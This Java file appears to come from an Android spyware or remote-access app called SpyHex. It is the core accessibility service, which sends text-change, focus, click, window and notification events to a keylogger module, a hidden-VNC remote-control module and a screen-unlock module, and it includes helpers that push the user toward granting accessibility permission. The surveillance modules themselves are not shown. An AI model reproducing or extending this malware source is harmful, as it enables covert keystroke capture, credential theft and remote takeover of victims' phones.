package com.spyhex.app.core;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.spyhex.app.features.hvnc.HVncAccessibilityService;
import com.spyhex.app.features.inspector.InspectorAccessibilityService;
import com.spyhex.app.features.keylogger.KeyloggerManager;
import com.spyhex.app.features.unlock.UnlockManager;

public class SpyHexAccessibilityService extends AccessibilityService {
    private static final String TAG = "SpyHexA11y";
    private static volatile SpyHexAccessibilityService instance;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        HVncAccessibilityService.onHostConnected(this);
        InspectorAccessibilityService.onHostConnected(this);
        KeyloggerManager.onHostConnected(this);
        UnlockManager.onHostConnected(this);
        Log.i(TAG, "Accessibility service connected");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        try {
            int type = event.getEventType();
            if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                HVncAccessibilityService.onAccessibilityEvent(event);
                KeyloggerManager.onAccessibilityEvent(event);
            } else if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
                       type == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
                KeyloggerManager.onAccessibilityEvent(event);
            } else if (type == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                KeyloggerManager.onAccessibilityEvent(event);
            } else if (type == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
                KeyloggerManager.onAccessibilityEvent(event);
            } else if (type == AccessibilityEvent.TYPE_ANNOUNCEMENT) {
                InspectorAccessibilityService.onAccessibilityEvent(event);
            }
        } finally {
            try { event.recycle(); } catch (Exception ignored) {}
        }
    }

    @Override
    public void onInterrupt() {
        Log.w(TAG, "Service interrupted");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        HVncAccessibilityService.onHostDisconnected();
        InspectorAccessibilityService.onHostDisconnected();
        KeyloggerManager.onHostDisconnected();
        UnlockManager.onHostDisconnected();
        instance = null;
        Log.i(TAG, "Service destroyed");
    }

    public static SpyHexAccessibilityService getInstance() {
        return instance;
    }

    public static boolean isServiceConnected() {
        return instance != null;
    }

    public static boolean isEnabled() {
        try {
            Context ctx = SpyHexApp.getContext();
            String enabled = Settings.Secure.getString(
                ctx.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (enabled == null) return false;
            String serviceName = ctx.getPackageName() + "/com.spyhex.app.core.SpyHexAccessibilityService";
            for (String token : enabled.split(":")) {
                if (token.equals(serviceName)) return true;
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    }

    public static void openSettings() {
        try {
            Context ctx = SpyHexApp.getContext();
            android.content.Intent intent = new android.content.Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
        } catch (Exception ignored) {}
    }
}
